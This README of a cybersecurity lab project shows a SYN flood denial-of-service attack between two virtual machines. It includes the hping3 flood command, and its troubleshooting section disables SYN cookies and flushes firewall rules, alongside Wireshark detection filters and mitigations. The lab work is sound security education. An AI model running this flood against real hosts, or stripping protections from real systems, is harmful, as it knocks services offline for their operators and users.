# 🚀 SYN Flood Attack Simulation & Packet Analysis  
_A Cybersecurity Lab Project_

![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Cybersecurity-red?style=for-the-badge)
![Attack](https://img.shields.io/badge/Attack-SYN_Flood-critical?style=for-the-badge)
![Parrot OS](https://img.shields.io/badge/OS-Parrot%20OS-darkgreen?style=for-the-badge)
![Wireshark](https://img.shields.io/badge/Tool-Wireshark-blue?style=for-the-badge)
![hping3](https://img.shields.io/badge/Tool-hping3-orange?style=for-the-badge)

---

## 📌 Overview

This project demonstrates a **SYN Flood Denial-of-Service (DoS) attack** performed in a controlled virtual cybersecurity lab environment using:

- **Parrot OS** (Attacker + Victim)
- **VirtualBox Host-Only Networking**
- **hping3** for generating SYN flood traffic
- **Wireshark** for packet capture and analysis

> ⚠️ Ethical Notice:  
> This experiment was performed strictly in an isolated lab setup for educational and research purposes.  
> Do **NOT** attempt these techniques on systems or networks without permission.

---

## 🧪 Lab Configuration

| Component | Details |
|----------|---------|
| Hypervisor | VirtualBox |
| Attacker OS | Parrot OS |
| Victim OS | Parrot OS |
| Network Mode | Host-Only |
| Attacker IP | `[REDACTED]` |
| Victim IP | `[REDACTED]` |

---

## 🛠 Tools Used

| Tool | Purpose |
|------|---------|
| `hping3` | SYN flood generator |
| **Wireshark** | Packet capture and analysis |
| `netstat` | Verify TCP state (`SYN_RECV`) |
| Metasploit (optional) | Additional attacker framework |

---

## ⚙️ Execution Steps

### 🧩 Step 1 — Install Required Tools

**Attacker:**
```bash
sudo apt update
sudo apt install hping3 metasploit-framework -y
```

**Victim:**
```bash
sudo apt update
sudo apt install wireshark -y
```

---

### 🧩 Step 2 — Start Packet Capture

On the victim machine, open **Wireshark** and apply:

```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

This filter shows SYN packets lacking an ACK response — typical in SYN flood attacks.

---

### 🧩 Step 3 — Launch SYN Flood (Attacker)

```bash
sudo hping3 -S --flood -p 80 <VICTIM-IP>
```

| Option | Meaning |
|--------|---------|
| `-S` | Sends TCP SYN packets |
| `--flood` | Sends packets as fast as possible |
| `-p 80` | Target port (HTTP) |
| `<VICTIM-IP>` | Redacted |

---

### 🧩 Step 4 — Verify Impact (Victim)

```bash
netstat -ant | grep SYN_RECV
```

Expected symptoms:

- Multiple half-open TCP connections  
- Lack of proper handshake (no SYN-ACK exchange)  
- Resource consumption / delay  

---

## 📊 Evidence & Interpretation

| Indicator | Result | Meaning |
|----------|--------|--------|
| High SYN packet rate | ✔ | DoS behavior confirmed |
| No ACK responses | ✔ | Incomplete handshake |
| Backlog via `SYN_RECV` | ✔ (after troubleshooting) | System overwhelmed |

---

## 🛡 Mitigation & Defense

| Technique | Purpose |
|-----------|---------|
| Enable SYN cookies | Protect TCP queue overflow |
| Apply rate-limiting firewall rules | Reduce impact |
| Use IDS/IPS (Suricata/Snort) | Detect anomalies |
| Fail2Ban | Auto-block abusive clients |

Enable SYN cookies:

```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
```


## 🛠 Troubleshooting

If Wireshark shows the SYN flood but `netstat` does **not** show `SYN_RECV`, follow these steps:

---

### ✔ 1 — Start a Web Server (Victim)

```bash
sudo python3 -m http.server 80
```

---

### ✔ 2 — Disable SYN Cookies (Lab Only)

Check status:

```bash
sysctl net.ipv4.tcp_syncookies
```

Disable temporarily:

```bash
sudo sysctl -w net.ipv4.tcp_syncookies=0
```

> ⚠️ Only for lab testing — do not disable in production.

---

### ✔ 3 — Allow Traffic (Remove Firewall Rules)

```bash
sudo iptables -F
```

---

### ✔ 4 — Run the Attack Again

```bash
sudo hping3 -S --flood -p 80 <VICTIM-IP>
```

---

### ✔ 5 — Check TCP State Again

```bash
netstat -ant | grep SYN_RECV
```

Expected output example:

```
tcp 0 0 [VICTIM-IP]:80 [ATTACKER-IP]:49152 SYN_RECV
tcp 0 0 [VICTIM-IP]:80 [ATTACKER-IP]:49153 SYN_RECV
```

---

## 🎯 Conclusion

This project successfully demonstrates how a SYN Flood attack affects a target system and how packet analysis tools like Wireshark can be used to identify characteristic traffic patterns. The experiment supports defensive understanding, network security training, and forensic investigation techniques.

---

